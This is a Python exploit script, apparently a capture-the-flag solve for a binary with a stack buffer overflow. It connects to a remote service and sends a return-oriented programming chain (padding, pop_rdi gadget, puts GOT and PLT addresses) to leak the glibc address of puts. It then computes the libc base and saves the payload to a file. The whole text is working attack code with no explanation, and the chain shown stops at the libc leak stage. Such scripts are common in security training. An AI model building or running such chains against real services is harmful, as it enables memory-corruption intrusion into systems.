import socket
import readline

host = '127.0.0.1'
port = 9000
host = '120.114.62.211'
port = 2125

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def recv(info=None):
  # TODO
  res = s.recv(4096)
  print(f'[<] {info if info else ""}')
  print(res)
  return res

def send(data):
  # TODO
  data = data + b'\n' if data[-1] != b'\n' else data
  s.send(data)

def interact():
  for _ in range(100):
    cmd = input('> ').encode('ascii')
    send(cmd)
    recv()

def leak_glibc(payload):
  recv()
  send(payload)
  #recv()
  #recv()
  puts_adr = recv().split(b'\n')[1]
  puts_adr = int.from_bytes(puts_adr, 'little')
  print(f'[*] puts adr: {puts_adr:#02x}')
  return puts_adr


# gadgets
pop_rdi    = 0x4006f3
pop_rsi    = 0x4006f1
puts_plt   = 0x4004e0
puts_got     = 0x601018
#printf_got   = 0x601020
#libc_start_main_got = 0x601028
#gets_got     = 0x601030
#setvbuf_got  = 0x601038

pad = b'A'*0x28

# Leak Glibc
payload  = pad
payload += pop_rdi.to_bytes(8, 'little')
payload += puts_got.to_bytes(8, 'little')
payload += puts_plt.to_bytes(8, 'little')

puts_adr = leak_glibc(payload)
# Find libc offset using https://libc.rip
# puts_offset    : 0x690
# gets_offset    : 0xd80
# setvbuf_offset : 0xe70 
puts_offset = 0x6f690

libc_base = puts_adr - puts_offset
print(f'[+] Libc Base: {libc_base:#02x}')

with open('payload', 'wb') as f:
  f.write(payload)

